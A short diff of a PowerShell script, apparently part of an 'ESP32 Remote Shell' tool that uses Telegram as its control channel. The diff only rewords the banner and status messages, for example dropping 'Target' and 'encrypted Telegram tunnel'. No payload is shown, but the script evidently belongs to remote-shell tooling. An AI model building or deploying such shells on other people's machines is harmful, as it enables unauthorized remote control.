@@ -10,7 +10,7 @@ Write-Host "      _\/\\\______\//\\\__\//\\\\\\\\\\_\/\\\__\/\\\__\/\\\__\///\\\
 Write-Host "       _\///________\///____\//////////__\///___\///___\///_____\/////_________\/////______\//////////____\///////////_____\///____\///____\//////////__\/////////__\/////////__" -ForegroundColor Cyan
 Write-Host ""
 Write-Host "==================================================================================================================================================================" -ForegroundColor DarkGray
-Write-Host "[*] Status: ESP32 Remote Shell // Establishing encrypted Telegram tunnel..." -ForegroundColor Yellow
+Write-Host "[*] Status: ESP32 Remote Shell - Establishing Connection..." -ForegroundColor Yellow
 
 $chatId = $null
 while (-not $chatId) {
@@ -23,7 +23,7 @@ while (-not $chatId) {
     if (-not $chatId) { Start-Sleep 2 }
 }
 
-Write-Host "[+] Connected! Target Chat ID: $chatId" -ForegroundColor Green
+Write-Host "[+] Connected! Chat ID: $chatId" -ForegroundColor Green
 $lastUpdateId = 0
 
 while ($true) {
